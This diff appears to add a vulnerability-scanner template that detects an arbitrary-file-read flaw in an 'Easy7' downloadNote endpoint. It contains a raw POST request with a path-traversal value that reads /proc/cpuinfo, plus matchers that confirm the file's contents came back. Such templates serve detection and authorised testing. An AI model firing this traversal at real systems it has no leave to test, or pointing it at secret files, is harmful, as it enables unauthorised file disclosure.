@@ -1,0 +1,28 @@
+id: Easy7-downloadNote-ReadAnyFile
+
+info:
+  name: Easy7-downloadNote-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    Easy7-downloadNote-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        POST /Easy7/rest/file/downloadNote HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fileName=/../../../proc/cpuinfo&fullName=1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "cpu family"
+          - "processor"
+        condition: and
